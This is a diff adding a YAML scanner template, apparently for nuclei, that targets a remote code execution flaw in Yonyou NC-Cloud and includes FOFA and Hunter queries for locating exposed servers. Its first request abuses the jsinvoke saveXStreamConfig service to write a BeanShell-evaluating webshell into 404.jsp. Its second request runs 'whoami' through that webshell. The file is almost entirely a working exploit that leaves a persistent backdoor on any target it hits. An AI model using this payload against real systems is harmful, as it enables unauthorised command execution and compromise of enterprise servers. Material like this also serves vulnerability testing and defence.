@@ -1,0 +1,47 @@
+id: 用友-NC-Cloud远程代码执行漏洞
+time: '2023-07-20'
+
+
+info:
+  name: 用友-NC-Cloud远程代码执行漏洞
+  severity: high
+  description: 用友-NC-Cloud,jsinvoke/?action=invoke可以通过特定接口上传文件，通过上传的webshell执行命令，目前全版本通杀
+  reference: https://mp.weixin.qq.com/s/AdbzqcXkZ4GoQUI3J6Qeyw
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: FOFA:app="用友-NC-Cloud"
+    Hunter: web.body="uap/rbac"
+  
+http:
+  - method: 
+      - POST
+      - POST
+    path:
+      - "{{BaseURL}}/uapjs/jsinvoke/?action=invoke"
+      - "{{BaseURL}}/404.jsp?error=bsh.Interpreter"
+
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded & Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 & Accept-Encoding:gzip, deflate &Accept-Language:zh-CN,zh;q=0.9 & Cookie:cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server & If-None-Match:W/"1571-1589211696000"  & If-Modified-Since:Mon, 11 May 2020 
+      - Content-Type:application/x-www-form-urlencoded & Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 & Accept-Encoding:gzip, deflate &Accept-Language:zh-CN,zh;q=0.9 & Cookie:cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server & If-None-Match:W/"1571-1589211696000"  & If-Modified-Since:Mon, 11 May 2020 
+        
+    body: 
+      - |
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/404.jsp"]}
+      - |
+        cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())
+        
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<?xml"
+
+      - type: status
+        status:
+          - 200
+    
